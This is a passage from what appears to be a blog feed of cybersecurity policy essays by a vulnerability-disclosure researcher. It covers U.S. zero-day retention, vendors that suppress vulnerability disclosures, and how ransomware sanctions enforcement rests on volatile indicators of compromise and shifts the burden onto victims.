<p>A GDDP shaped by secrecy, unchecked executive power, and offensive priorities can threaten that balance. The VEP has already <a href="https://www.zetter-zeroday.com/u-s-government-disclosed-39-zero-day-vulnerabilities-in-2023-per-first-ever-report/">faced criticism</a> for a perceived lack of transparency, as reflected in the <a href="https://www.wyden.senate.gov/imo/media/doc/fy23_unclassified_vep_annual_reportpdf.pdf">ODNI’s first public disclosure report</a> on retained and disclosed vulnerabilities. The criticism highlights the need for greater public insight into the VEP to determine whether it genuinely prioritizes defense over offense, something recent developments appear to contradict. The public is losing insight into how vulnerabilities are handled, while the private sector–which is often on the frontlines of cyberattacks–is left in the dark. This lack of transparency further erodes accountability, which again reinforces a shift towards cyber power centralization within the executive branch.</p>

<p>In the case of the United States, this trajectory is a textbook example of something larger. The Narrow Corridor describes the concept of a <em>Despotic Leviathan</em>(originating from Hobbes’ <em>Leviathan</em>), where unchecked state control weakens security and liberty. With the removal of oversight mechanisms and consolidation of cybersecurity authority, the Trump administration risks prioritizing short-term strategic advantages over long-term resilience, ultimately weakening U.S. cybersecurity. This concern is particularly important in light of the current <a href="https://www.politico.com/news/magazine/2025/01/28/trump-tiktok-bailout-00200800">congressional inaction</a> and the <a href="https://time.com/7210420/justice-department-fires-employees-prosecutions-trump/">removal of government officials</a> involved in Trump’s criminal prosecution, further undermining institutional checks and balances.</p>

<p>This is where the <em>Red Queen</em> concept from the Narrow Corridor becomes relevant. To stay secure, both the state and society must run to remain in the “narrow corridor”. By actively sidelining society’s oversight role, the Trump administration disrupts this balance, undermining the reciprocal strengthening that supports resilient governance, robust cybersecurity, and civil liberty.</p>

<h1 id="consequences-and-global-shifts">Consequences and global shifts</h1>
<ul>
  <li><strong>Allies may feel compelled to retain:</strong> U.S. posture may inadvertently pressure other countries to deprioritize disclosure, even if it contradicts their public policy.</li>
  <li><strong>Private sector is left exposed:</strong> Coordinating large-scale vulnerability disclosures has shown me just how far the ripples from a single flaw can reach. When retained vulnerabilities leak (or worse, when no one knows they exist), the fallout isn’t theoretical. A great example is EternalBlue: originally retained by the NSA, it was later leaked and exploited in the WannaCry and NotPetya attacks, which were two of the most disruptive cybersecurity incidents in recent history. These attacks weren’t launched by state actors, but by criminal and proxy groups.</li>
  <li><strong>Norms begin to fracture:</strong> The idea of disclosure as responsible security weakens when strategic ambiguity dominates global cyber policy.</li>
</ul>

<h1 id="conclusion-rediscovering-the-corridor">Conclusion: rediscovering the corridor</h1>
<p>Zero-day vulnerabilities are not just technical artifacts, they are instruments of policy. While the U.S. has not explicitly stated it is retaining more vulnerabilities, its broader cyber strategy sends signals that may shift global expectations.</p>

<p>Like the dreadnought before World War I, offensive cyber capability can reset norms in dangerous ways. To remain in the Narrow Corridor, the U.S. should lead by example: strengthening oversight, maintaining transparency, and upholding vulnerability disclosure as a pillar of cyber resilience.</p>

<p>From where I stand, real strength doesn’t lie in how many vulnerabilities are kept, but in what is disclosed, when, and why. That’s the foundation of trust–and trust, <a href="https://archive.org/details/kerckhoffs.translated.pdf">not secrecy</a>, is what makes the internet more secure.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Vulnerability Disclosure" /><category term="Cybersecurity Policy &amp; Ethics" /><summary type="html"><![CDATA[When one nation hoards weapons, others feel compelled to follow. The U.S. posture on zero-day retention risks global insecurity through a dynamic we've seen before.]]></summary></entry><entry><title type="html">What You Hide Will Hurt You: The Streisand Effect of Zero-Day Vulnerabilities</title><link href="http://localhost:4000/2025/05/24/what-you-hide-will-hurt-you-zero-day-vulnerabilities.html" rel="alternate" type="text/html" title="What You Hide Will Hurt You: The Streisand Effect of Zero-Day Vulnerabilities" /><published>2025-05-24T00:00:00+02:00</published><updated>2025-05-24T00:00:00+02:00</updated><id>http://localhost:4000/2025/05/24/what-you-hide-will-hurt-you-zero-day-vulnerabilities</id><content type="html" xml:base="http://localhost:4000/2025/05/24/what-you-hide-will-hurt-you-zero-day-vulnerabilities.html"><![CDATA[<p>When I first became a CVE Numbering Authority (CNA) administrator at DIVD, I assumed most software vendors would welcome a heads-up about critical vulnerabilities in their products. We’re not selling zero-days, we’re helping these vendors remediate them. However, over time, I learned a strange truth: many vendors would rather silence the messenger than fix the message. From legal threats to ostrich politics, the instinct to cover-up a zero-day vulnerability runs deep. Ironically, it’s this reaction (rather than the vulnerability itself) that often causes the most reputational damage. What you hide will hurt you. And in cybersecurity, few things backfire harder than trying to bury insecurity.</p>

<h1 id="life-as-a-cna-administrator">Life as a CNA administrator</h1>
<p>CNAs are organizations authorized by the <a href="https://cve.mitre.org">CVE Program</a> to assign CVE IDs to newly discovered vulnerabilities and publish related details. CNAs are the backbone of the distributed vulnerability reporting system that powers CVE. They can be software vendors, coordination centers, bug bounty platforms, or, like DIVD, security research groups.</p>

<p>Being a CNA administrator at DIVD means acting as a trusted intermediary in the vulnerability disclosure process. Specifically, DIVD is designated as a Research CNA: a type of CNA authorized to assign CVE IDs for vulnerabilities discovered through its own independent security research. Unlike vendor CNAs, which typically cover the security of their own products, Research CNAs do not need to be the creator or maintainer of the affected software and do not rely on vendor permission to assign a CVE. As a Research CNA administrator, we receive vulnerability reports, validate them, coordinate with the vendors where possible, and publish CVE records when Coordinated Vulnerability Disclosure processes have followed through. This role is about much more than just managing identifiers though, it’s about navigating technical, ethical, and sometimes political terrain.</p>

<p>At DIVD, our approach is public-interest driven: typically we are of the opinion that the public has the right to know about a security issue in the software they use. After all, it may affect them personally and they have the right to decide whether or not they want to continue using this software. Therefore, after making sure we have successfully coordinated a disclosure and a remediation has been issued, we also tend to seek out people that are still affected by the vulnerability in order to warn them. The first step in doing this is always to coordinate a disclosure with the vendor, otherwise we end up resorting to disproportionate methodology as is <a href="https://disclosing.observer/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html">extensively discussed in my article on disclosure ethics</a>. Our mission is clear, but the path isn’t always smooth. Some vendors cooperate openly, understanding the value of transparency and early warnings. Others treat our contact as a threat instead of a courtesy, despite the fact that we’re offering voluntary help, not blame.</p>

<p>Over time, this role teaches you something about organizational maturity, communication under pressure, and how reputations are built (or broken) in the way vendors respond to bad news.</p>

<p><img src="../../../assets/CNA-workflow.svg" alt="" class="centered-img" />
<span class="centered-text">Figure 1: CNA workflow</span></p>

<h1 id="the-playbook-of-avoidance">The playbook of avoidance</h1>
<p>Not all companies react the same way to a vulnerability disclosure. Some respond with a clear acknowledgement, quick triage, and a patch timeline. Others will stall, deny, escalate to legal teams, or straight up ignore you hoping to demoralize so that you give up. All of this happens before anyone technical has even looked at the report. These tactics aren’t just frustrating, they’re risky. In the case of some critical vulnerabilities, the time to patch needs to be as short as possible. Every delay increases the window of exploitation and, paradoxically, draws more attention when the issue finally surfaces.</p>

<p>Earlier this year we handled a report that shows just how long some vendors will try to wait you out. An independent researcher, now a member of DIVD, had uncovered a set of high-severity vulnerabilities in a software product widely used by government agencies in one particular country. He had been emailing the vendor, politely and persistently, since 2022. He had received no response. Once the report reached DIVD we re-validated the bugs and started our standard outreach: attempts to contact by phone, email, and LinkedIn. Three months passed, after which we requested that this country’s national CSIRT relay the warning. They, too, were met with radio silence. With 90 days gone and no progress, we published a limited disclosure that included the newly assigned CVE IDs and the advice to not use this product anymore due to the fundamental design weaknesses. Within twenty-four hours, the vendor surfaced: not with a remediation plan, but with a complaint that they “did not want their customers to know about these issues” and that they “wanted the publication taken down”. This is a perfect example of the <em>ignore-until-it-hurts</em> tactic: three years of quiet, private nudging produced nothing; one short public notice produced an immediate, though still defensive, response.</p>

<p>This is why we tend to alert vendors that we are sticking to <a href="https://csirt.divd.nl/cna/">our own written CNA procedure</a>. This procedure is based on the <a href="https://english.ncsc.nl/publications/publications/2019/juni/01/coordinated-vulnerability-disclosure-the-guideline">Coordinated Vulnerability Disclosure guideline</a> by the Dutch National Cyber Security Center (NCSC-NL). This guideline discusses the general consensus that a 60-day window should be sufficient to fix most software vulnerabilities. Hardware vulnerabilities should take longer and have a 180-day window. Of course, as long as a vendor is communicating openly about their progress, we will not be stringent about this. However, we are not afraid to use this as a tool to leverage a response and ultimately inform the public about the (at that point still unpatched) vulnerability. We will do this through a so-called limited disclosure and product warning. Vendors get to deliver input on the framing of any publications as we do not move towards this type of last resort, making it clearly in their best interest to collaborate and take responsibility. In the end, limited disclosures that contain the information that a vendor was not available for response or remediation do not look good.</p>

<h1 id="the-role-of-the-security-industry-in-this-mess">The role of the security industry in this mess</h1>
<p>But let’s be honest: part of the problem may be the cybersecurity industry as a whole. We have created some of the very incentives that make vendors want to hide their flaws. For years, we’ve treated the number of CVEs associated with a vendor as a scoreboard for vulnerability. Many practitioners still do. Think report headlines like <em>Top 10 Most Vulnerable Vendors This Year</em>. What does a high CVE count say to the public? Poor security. Broken systems. Incompetence.</p>

<p>In reality, it’s often the opposite. A high number of CVEs can signal maturity of the vulnerability management processes within an organization: people are looking, problems are being fixed, and the system is transparent enough to document it. That’s a sign of a functioning security posture rather than a failing one. For example, in 2024, the <a href="https://www.cvedetails.com/top-50-vendors.php?year=2024">top vendor with distinct vulnerabilities registered as CVEs </a> was <em>Linux</em> with 3874 CVE IDs. The Linux community is likely one of the most security-aware ones out there, which is partially why they keep finding new issues that are then registered as CVEs. When we shame companies for having vulnerabilities, which is something that happens to the best of us, we create incentives for censorship. That’s on us. If disclosure is to work, we have to stop treating visibility as guilt. At this point, one could even say that it is suspicious when a vendor does not have any claimed CVE IDs or otherwise published vulnerabilities.</p>

<h1 id="when-the-cover-up-becomes-the-story">When the cover-up becomes the story</h1>
<p>Here’s the thing about unresolved limited disclosures: most vulnerabilities don’t become front-page news on their own. What gets remembered, and what is reported, is how a company handles the situation once it becomes aware of the problem. In many cases, the vulnerability itself isn’t what harms a company’s reputation. It’s the response.</p>

<p>Obstructing disclosure, delaying patches, trying to silence or ignore researchers. It creates a second story: one that says they don’t take security seriously. That second story spreads faster and sticks longer. Public shaming often follows obstruction, in contrast to the belief of some of these vendors that having to publish CVE IDs will tarnish their reputation. Media and researchers take note of silence and hostility. Customers, partners, and regulators may start asking questions. The issue inevitably becomes public, but now with a damaging narrative: lack of transparency and accountability. A great example of this is <a href="https://www.cnbc.com/2020/04/02/zoom-ceo-apologizes-for-security-issues-users-spike-to-200-million.html">the repeated security issues with videoconferencing software Zoom</a>, in which the vendor was aware of various vulnerabilities that were discovered by the public. Because of the vulnerabilities, the publicity it received, and the (lack of) response by the company behind Zoom, various large companies like NASA and SpaceX <a href="https://www.zdnet.com/article/zoom-were-freezing-all-new-features-to-sort-out-security-and-privacy/">banned the use of Zoom altogether</a>, setting an important precedent.</p>

<p>That’s the Zero-Day Streisand effect. The more you try to hide the problem, the more visible and damaging it becomes.</p>

<h1 id="what-good-looks-like">What good looks like</h1>
<p>Far from all responses are defensive or hostile. There are plenty of companies I’ve worked with that handle disclosures with transparency, speed, and professionalism. The contrast is absolutely striking. These are the organizations that take action within hours, thank us for the report, and keep us in the loop on remediation progress. They prioritize patching the issue, even when it’s inconvenient. Some even take it a step further by publishing advisories, calling customers, publicly crediting the researcher, and using the opportunity to show their commitment to security.</p>

<p>These companies don’t just fix bugs, they build trust. Ironically, some of the best reputations I’ve seen were forged in the heat of a serious vulnerability. Because when you handle bad news well, it says something powerful in my opinion: you’re not perfect, but you’re responsible. Companies that respond constructively earn real credibility, even when the vulnerability is a serious one. A result of this is that potential PR hits are turned into a trust-building moment both internally and externally. They signal that they take their security seriously, and this is what their customers (and employees) remember.</p>

<h1 id="conclusion-transparency-is-the-real-fix">Conclusion: transparency is the real fix</h1>
<p>Every product has vulnerabilities. That’s not the issue. The issue is whether you fix them, or spend your valuable time fighting the people that try to help you do so. Trying to hide zero-day vulnerabilities doesn’t protect a brand. It fractures trust. Once the cover-up becomes the story, you’ve lost control of the narrative. The Streisand Effect takes over.</p>

<p>Security isn’t about being flawless. It’s about being accountable. We need to stop punishing companies for being transparent, and this is an upcoming trend I am very happy to see. We need to recognize and reward taking the right steps when things become difficult. This is because in the long run, what you hide will hurt you.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Vulnerability Disclosure" /><summary type="html"><![CDATA[Most vulnerabilities never make headlines; botched disclosures do. Trying to muzzle researchers doesn’t shrink risk, it spotlights it.]]></summary></entry><entry><title type="html">The Ransomware Blame Game: Who Bears the Burden of Sanction Enforcement?</title><link href="http://localhost:4000/2025/05/17/ransomware-blame-game.html" rel="alternate" type="text/html" title="The Ransomware Blame Game: Who Bears the Burden of Sanction Enforcement?" /><published>2025-05-17T00:00:00+02:00</published><updated>2025-05-17T00:00:00+02:00</updated><id>http://localhost:4000/2025/05/17/ransomware-blame-game</id><content type="html" xml:base="http://localhost:4000/2025/05/17/ransomware-blame-game.html"><![CDATA[<p>When I worked in a Computer Emergency Response Team (CERT), ransomware cases were part of the routine. A company would be hit, backups failed, and the question of ransom payment would come up. Every so often, the team would offer the option of a sanction checking service to verify whether payment was even legal. However, these sanction checks would depend on indicators like cryptocurrency wallet addresses, file hashes, IP addresses, and domain names. These were all indicators that were known to be volatile, so I wondered: <em>how effective is this really?</em>.</p>

<p>These checks felt necessary but rarely brought clarity. Infrastructure changed constantly. Attribution was fragile and full of assumptions, and the same group might be known under a different name next week. Even when the style of a ransomware operation was recognized, it didn’t guarantee that we could connect it to a known actor. The attacker would disappear after the ransom payment, but the legal and financial risk remained, now shifted onto the victim.</p>

<p>That discomfort stuck with me. So when I had the opportunity to start working on <a href="https://www.usenix.org/conference/usenixsecurity25/presentation/van-der-horst">the paper this post is based on</a>, it wasn’t just about the fragility of different Indicators of Compromise (IoCs). 	It was about something deeper: what happens when policy assumes a level of certainty that defenders simply don’t have? This blogpost is an extension of the USENIX paper: a reflection on how our current enforcement and compliance frameworks place responsibility on those with the least access to reliable information. It is not a call to weaken sanctions policy, but a call to make it more just. If sanctions are meant to constrain attackers, then enforcement must be designed to reach them–not to retroactively penalize the victims.</p>

<h1 id="the-limits-of-technical-attribution">The limits of technical attribution</h1>
<p>In Threat Intelligence, attribution is a layered process. <em>Low-level IoCs</em>, pieces of evidence related to infrastructure, the attack, payment methods, and other operational details, are easy to collect and useful for detection. However, they are extremely volatile. These indicators can be changed with little effort by attackers, making them poor foundations for long-term attributions. This idea has been confirmed by frameworks like Bianco’s <a href="https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html">Pyramid of Pain</a> and Rid and Buchanan’s <a href="https://cs.brown.edu/courses/cs180/sources/Attributing_Cyber_Attacks.pdf">Q-Model</a>.</p>

<p>Hence, it seems irresponsible to base sanctions lists on these low-level indicators, which is why the paper behind this post investigates the value of <em>high-level IoCs</em>. By contrast, high-level IoCs capture behavioral traits such as how attackers deploy their malware, how they move laterally, ransom note linguistics, negotiation attitudes, and Tactics, Techniques, and Procedures (TTPs). Both models agree that high-level indicators are more resilient to evasion and thus more trustworthy across rebrandings.</p>

<p><img src="../../../assets/models.png" alt="" class="centered-img" />
<span class="centered-text">Figures 1 &amp; 2: The Pyramid of Pain and the Q-Model</span></p>

<h2 id="the-affiliate-wild-card">The affiliate wild-card</h2>
<p>Many ransomware operations follow an affiliate model known as Ransomware-as-a-Service (RaaS), in which core developers lease their tools to independent partners. These affiliates vary widely in skill and methods, and while operators often provide deployment guidelines, affiliates may diverge from them in practice. As a result, high-level indicators, such as lateral movement techniques or tooling preferences, can differ significantly even within the same group, adding noise to attribution efforts.</p>

<h2 id="observations-from-the-paper">Observations from the paper</h2>
<p>We analysed datasets containing information on ransomware incidents: 27 private incident reports from an incident response company and 13 public CISA advisories based on various other incident response organizations. Two findings stood out from this data:</p>

<figure class="figure-float-right">
  <img src="../../../assets/radar-chart-overlap-sim.png" alt="Radar chart" />
  <figcaption>Figure 3: Similarity metrics across ransomware groups</figcaption>
</figure>

<ul>
  <li><strong>Inside a single “brand,” the technical overlap was surprisingly low.</strong> Different incidents linked to the same group often shared fewer than half their TTPs.</li>
  <li><strong>Across sources, the overlaps became even lower.</strong> What CISA published and what the responders from our partnering company observed for the same group only line up part of the time. This shows a significant discrepancy between the reporting of different organizations, which undermines the assumption that defenders (or regulators) have access to a consistent view of attacker behaviour at the time sanctions checks are performed.</li>
</ul>

<p>In short, the low-level indicators that sanctions lists currently lean on tend to expire quickly, while no one seems to have a comprehensive overview of the behavioural high-level indicators. While this dataset is of course not exhaustive, the consistency of these patterns across both public and private reporting streams underscores their broader relevance.</p>

<h2 id="why-this-matters-for-sanctions">Why this matters for sanctions</h2>
<p>Yet, most compliance frameworks, and even some insurance policies, continue to rely on indicators that appear to uniquely identify a ransomware group. This is an understandable position: enforcement systems require clear identifiers to function. However, this expectation favors indicators that are easily assigned over indicators that are more stable but less individually distinctive.</p>

<p>As a result, and as confirmed by our interviewees, high-level behavioural indicators are often excluded from compliance checks, not because they are unreliable, but because they lack the singularity needed to support legal or financial action. Sanctions enforcement, therefore, depends on low-level indicators not due to their robustness, but because they are uniquely attributable. This is true even when those same indicators can be changed by attackers with minimal effort.</p>

<p>Until enforcement frameworks find a way to operationalise high-level signals across rebrandings, defenders will have to deal with indicators that are known to change rapidly. In practice, this means working with the most accessible signals, not the most meaningful ones.</p>

<h1 id="rebranding-as-a-sanctions-evasion-strategy">Rebranding as a sanctions-evasion strategy</h1>
<p>Ransomware groups don’t stay still. After public exposure, <a href="https://www.cisecurity.org/insights/blog/the-conti-leaks-a-case-of-cybercrimes-commercialization">internal conflict</a>, or sanctions, many simply dissolve and rebrand under a new name. The infamous Conti group, for instance, splintered into <a href="https://www.hhs.gov/sites/default/files/blacksuit-ransomware-analyst-note-tlpclear.pdf">several new entities</a>, including Royal and then BlackSuit, among others. These new groups often adopt new infrastructure, names, leak sites, and negotiation portals, but retain (some of) the same personnel, malware toolchains, and affiliate relationships.</p>

<p>This rebranding breaks the link between old and new entities in legal and public intelligence contexts. While threat researchers may recognize the continuity, governments may typically require formal evidence of control or ownership to link a new group to a sanctioned predecessor. That process is slow, often opaque, and rarely public. Months can pass before rebranded groups are re-sanctioned, during which victims remain legally exposed.</p>

<p>Victims, meanwhile, are expected to know better. If they pay a ransom to a group that is later tied to a sanctioned actor, they may be penalized, even if the link was not publicly known at the time of payment. Various interviewees in the study mentioned this to be a great risk to the victim, as insurers can (and will) try to claw back a paid-out ransom months later if the recipient is sanctioned after the fact, effectively retro-dating the exclusion to the payment date. Moreover, the moment a ransomware group is sanctioned, it may trigger a rebrand, further obfuscating the public overview. This is the heart of the policy asymmetry: ransomware groups can easily obscure their identities whereas defenders and victims are expected to see through the smoke.</p>

<h1 id="the-information-deficit-and-the-burden-of-compliance">The information deficit and the burden of compliance</h1>
<p>This means that the position that a victim of ransomware finds themselves in can be framed as an information deficit. The entities responsible for enforcing compliance, such as governments, regulators, and insurers, operate on the assumption that attribution is clear and actionable. However, in ransomware cases, attribution is often incomplete, delayed, or ambiguous.</p>

<p>The ransomware cases we’ve analyzed in our study show that low-level indicators rarely persisted across incidents, let alone rebrandings. In several cases, ransom payments were made to groups not publicly sanctioned at the time, only for links to sanctioned actors to emerge through later intelligence analysis. These links often relied on high-level behavior indicators like linguistics, panel design reuse, or TTPs, which were absent from standard sanction checks.</p>

<p>This creates a <em>critical gap</em>: compliance decisions are expected to be based on indicators that are technically available but operationally unreliable. Meanwhile, indicators that could offer stronger attribution are often not included in threat feeds or sanctions designations, and are not legally recognized as sufficient evidence. Furthermore, because of phenomena like the Ransomware-as-a-Service (RaaS) ecosystem, slight deviations in reporting using frameworks like the <a href="https://attack.mitre.org">MITRE ATT&amp;CK Matrix</a>, and the commercialisation of the Threat Intelligence industry, data is so fragmented that no single organization appears to have a comprehensive view of high-level indicators, making coordinated enforcement even more difficult. This also means that even when TTP combinations appear distinctive on paper, the fragmentation and inconsistency across sources make them impractical for real-world sanctions checks.</p>

<p>In practice, this means that defenders may act in good faith based on the best available data and still find themselves in violation of compliance expectations. While European countries are typically more forgiving than the U.S. by taking into account their <a href="https://finance.ec.europa.eu/document/download/65560de8-a13a-4a58-a87c-ddd27b14e6c1_en?filename=faqs-sanctions-russia-best-efforts-obligation_en.pdf"><em>Best Efforts regulation</em></a>, payment to a sanctioned entity still opens up a victim to legal or financial consequences. 	Several European and American cyber-insurance wordings now not only <a href="https://assets.lloyds.com/media/47dd9b48-e881-4169-8a98-8d305a1d6fce/Y5359.pdf">exclude reimbursement for ransoms that benefit a sanctioned party</a>, but also reserve the right to <a href="https://cilj.law.uconn.edu/wp-content/uploads/sites/2520/2022/04/Ransomware-Kenneally-CILJ-Vol.-28.1.pdf"><strong>recover a payout after the fact</strong></a> if new intelligence or a late-issued designation reveals that the attackers were sanctioned. Retroactive enforcement of these exclusions, whether via contract or regulation, shifts the risk back onto those least equipped to verify attribution in real time: the victims.</p>

<h1 id="structural-asymmetry-in-ransomware-enforcement">Structural asymmetry in ransomware enforcement</h1>
<p>The outcome is a deeply asymmetrical system. Attackers operate in a fluid, pseudonymous ecosystem. Defenders operate under legal obligations, audit trails, and policy scrutiny. Compliance rules are often applied rigidly. Not only by governments, but increasingly by cyber insurers, even when the available indicators are ambiguous.</p>

<p>Our research calls attention to this structural misalignment. It is not simply a technical issue, but a policy failure. By placing the burden of accurate attribution on defenders, we ignore the reality that attribution is contested and delayed, even among experts.</p>

<p>As I mentioned in the beginning of this article, this post does not argue against the principle of sanctions. It can be a legitimate tool of pressure, deprivation, and deterrence. Rather, it argues that sanctions policy must evolve to strike at the actors it was meant to constrain, not those it was meant to protect. Enforcement that punishes victims through uncertainty does not advance justice; it undermines it.</p>

<h1 id="policy-recommendations-toward-risk-aware-compliance">Policy recommendations: toward risk-aware compliance</h1>
<p>Of course, I am not arguing that we should abandon sanctions policy altogether. Instead, it would be better to propose a more realistic and risk-aware approach:</p>

<ul>
  <li><strong>Recognize the limits of low-level indicators and require corroboration.</strong> Enforcement actions should not hinge on volatile indicators alone. Additional behavioral or contextual evidence should be required to support sanctions-related decisions.</li>
  <li><strong>Promote the development and sharing of behavioral-level CTI.</strong> Encourage public-private sharing of ransomware tradecraft indicators and support open databases that track rebrand linkages, like the U.S. Cybersecurity and Infrastructure Security Agency’s (CISA) <a href="https://www.cisa.gov/stopransomware">#StopRansomware campaign</a>, where they share observed indicators from various organizations.</li>
  <li><strong>Establish a cross-sector CTI clearing house.</strong> All 20 experts we interviewed independently called for a neutral, non-commercial platform to consolidate and curate ransomware attribution data. No single entity today has the necessary scope or trust to do this alone.</li>
  <li><strong>Introduce proportionality and good-faith standards</strong> in compliance enforcement. If a victim acted on available information and had no access to classified or high-confidence attribution, they should be protected instead of penalized anywhere.</li>
  <li><strong>Improve transparency of sanctions intelligence.</strong> Where governments establish control or continuity between groups, this information should be shared with defenders, not just for enforcement.</li>
</ul>

<p>These are not radical departures from current policy. They are adjustments grounded in the technical and operational realities of the ransomware ecosystem.</p>

<h1 id="conclusion-enforcement-should-follow-evidence-not-assumption">Conclusion: enforcement should follow evidence, not assumption</h1>
<p>Sanctions are a legitimate tool of deterrence. But in the ransomware context, their enforcement often assumes more clarity and certainty than defenders and victims actually possess. Attribution is rarely unambiguous. Indicators change, groups rebrand, and intelligence arrives too late to guide real-time decisions. Current enforcement frameworks place responsibility on victims to act with <em>perfect foresight</em> in an environment defined by uncertainty. This doesn’t advance justice—it undermines it.</p>

<p>If policy is to support resilience rather than amplify harm, it must reflect how threat intelligence actually works. That means supporting enforcement with persistent, behavioral signals rather than fragile, low-level ones. It also means ensuring that all parties involved have access to the same information. It means recognizing the asymmetries between attackers who can vanish and reappear at will, and defenders who are left to navigate compliance obligations in the dark.</p>

<p>We can’t sanction what we can’t see. And we shouldn’t punish those who were never the intended target.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Cybersecurity Policy &amp; Ethics" /><category term="Observations on Cyber Threat Intelligence" /><category term="Research Process" /><summary type="html"><![CDATA[When I worked in a Computer Emergency Response Team (CERT), ransomware cases were part of the routine. A company would be hit, backups failed, and the question of ransom payment would come up. Every so often, the team would offer the option of a sanction checking service to verify whether payment was even legal. However, these sanction checks would depend on indicators like cryptocurrency wallet addresses, file hashes, IP addresses, and domain names. These were all indicators that were known to be volatile, so I wondered: how effective is this really?. These checks felt necessary but rarely brought clarity. Infrastructure changed constantly. Attribution was fragile and full of assumptions, and the same group might be known under a different name next week. Even when the style of a ransomware operation was recognized, it didn’t guarantee that we could connect it to a known actor. The attacker would disappear after the ransom payment, but the legal and financial risk remained, now shifted onto the victim. That discomfort stuck with me. So when I had the opportunity to start working on the paper this post is based on, it wasn’t just about the fragility of different Indicators of Compromise (IoCs). It was about something deeper: what happens when policy assumes a level of certainty that defenders simply don’t have? This blogpost is an extension of the USENIX paper: a reflection on how our current enforcement and compliance frameworks place responsibility on those with the least access to reliable information. It is not a call to weaken sanctions policy, but a call to make it more just. If sanctions are meant to constrain attackers, then enforcement must be designed to reach them–not to retroactively penalize the victims. The limits of technical attribution In Threat Intelligence, attribution is a layered process. Low-level IoCs, pieces of evidence related to infrastructure, the attack, payment methods, and other operational details, are easy to collect and useful for detection. However, they are extremely volatile. These indicators can be changed with little effort by attackers, making them poor foundations for long-term attributions. This idea has been confirmed by frameworks like Bianco’s Pyramid of Pain and Rid and Buchanan’s Q-Model. Hence, it seems irresponsible to base sanctions lists on these low-level indicators, which is why the paper behind this post investigates the value of high-level IoCs. By contrast, high-level IoCs capture behavioral traits such as how attackers deploy their malware, how they move laterally, ransom note linguistics, negotiation attitudes, and Tactics, Techniques, and Procedures (TTPs). Both models agree that high-level indicators are more resilient to evasion and thus more trustworthy across rebrandings. Figures 1 &amp; 2: The Pyramid of Pain and the Q-Model The affiliate wild-card Many ransomware operations follow an affiliate model known as Ransomware-as-a-Service (RaaS), in which core developers lease their tools to independent partners. These affiliates vary widely in skill and methods, and while operators often provide deployment guidelines, affiliates may diverge from them in practice. As a result, high-level indicators, such as lateral movement techniques or tooling preferences, can differ significantly even within the same group, adding noise to attribution efforts. Observations from the paper We analysed datasets containing information on ransomware incidents: 27 private incident reports from an incident response company and 13 public CISA advisories based on various other incident response organizations. Two findings stood out from this data: Figure 3: Similarity metrics across ransomware groups Inside a single “brand,” the technical overlap was surprisingly low. Different incidents linked to the same group often shared fewer than half their TTPs. Across sources, the overlaps became even lower. What CISA published and what the responders from our partnering company observed for the same group only line up part of the time. This shows a significant discrepancy between the reporting of different organizations, which undermines the assumption that defenders (or regulators) have access to a consistent view of attacker behaviour at the time sanctions checks are performed. In short, the low-level indicators that sanctions lists currently lean on tend to expire quickly, while no one seems to have a comprehensive overview of the behavioural high-level indicators. While this dataset is of course not exhaustive, the consistency of these patterns across both public and private reporting streams underscores their broader relevance. Why this matters for sanctions Yet, most compliance frameworks, and even some insurance policies, continue to rely on indicators that appear to uniquely identify a ransomware group. This is an understandable position: enforcement systems require clear identifiers to function. However, this expectation favors indicators that are easily assigned over indicators that are more stable but less individually distinctive. As a result, and as confirmed by our interviewees, high-level behavioural indicators are often excluded from compliance checks, not because they are unreliable, but because they lack the singularity needed to support legal or financial action. Sanctions enforcement, therefore, depends on low-level indicators not due to their robustness, but because they are uniquely attributable. This is true even when those same indicators can be changed by attackers with minimal effort. Until enforcement frameworks find a way to operationalise high-level signals across rebrandings, defenders will have to deal with indicators that are known to change rapidly. In practice, this means working with the most accessible signals, not the most meaningful ones. Rebranding as a sanctions-evasion strategy Ransomware groups don’t stay still. After public exposure, internal conflict, or sanctions, many simply dissolve and rebrand under a new name. The infamous Conti group, for instance, splintered into several new entities, including Royal and then BlackSuit, among others. These new groups often adopt new infrastructure, names, leak sites, and negotiation portals, but retain (some of) the same personnel, malware toolchains, and affiliate relationships. This rebranding breaks the link between old and new entities in legal and public intelligence contexts. While threat researchers may recognize the continuity, governments may typically require formal evidence of control or ownership to link a new group to a sanctioned predecessor. That process is slow, often opaque, and rarely public. Months can pass before rebranded groups are re-sanctioned, during which victims remain legally exposed. Victims, meanwhile, are expected to know better. If they pay a ransom to a group that is later tied to a sanctioned actor, they may be penalized, even if the link was not publicly known at the time of payment. Various interviewees in the study mentioned this to be a great risk to the victim, as insurers can (and will) try to claw back a paid-out ransom months later if the recipient is sanctioned after the fact, effectively retro-dating the exclusion to the payment date. Moreover, the moment a ransomware group is sanctioned, it may trigger a rebrand, further obfuscating the public overview. This is the heart of the policy asymmetry: ransomware groups can easily obscure their identities whereas defenders and victims are expected to see through the smoke. The information deficit and the burden of compliance This means that the position that a victim of ransomware finds themselves in can be framed as an information deficit. The entities responsible for enforcing compliance, such as governments, regulators, and insurers, operate on the assumption that attribution is clear and actionable. However, in ransomware cases, attribution is often incomplete, delayed, or ambiguous. The ransomware cases we’ve analyzed in our study show that low-level indicators rarely persisted across incidents, let alone rebrandings. In several cases, ransom payments were made to groups not publicly sanctioned at the time, only for links to sanctioned actors to emerge through later intelligence analysis. These links often relied on high-level behavior indicators like linguistics, panel design reuse, or TTPs, which were absent from standard sanction checks. This creates a critical gap: compliance decisions are expected to be based on indicators that are technically available but operationally unreliable. Meanwhile, indicators that could offer stronger attribution are often not included in threat feeds or sanctions designations, and are not legally recognized as sufficient evidence. Furthermore, because of phenomena like the Ransomware-as-a-Service (RaaS) ecosystem, slight deviations in reporting using frameworks like the MITRE ATT&amp;CK Matrix, and the commercialisation of the Threat Intelligence industry, data is so fragmented that no single organization appears to have a comprehensive view of high-level indicators, making coordinated enforcement even more difficult. This also means that even when TTP combinations appear distinctive on paper, the fragmentation and inconsistency across sources make them impractical for real-world sanctions checks. In practice, this means that defenders may act in good faith based on the best available data and still find themselves in violation of compliance expectations. While European countries are typically more forgiving than the U.S. by taking into account their Best Efforts regulation, payment to a sanctioned entity still opens up a victim to legal or financial consequences. Several European and American cyber-insurance wordings now not only exclude reimbursement for ransoms that benefit a sanctioned party, but also reserve the right to 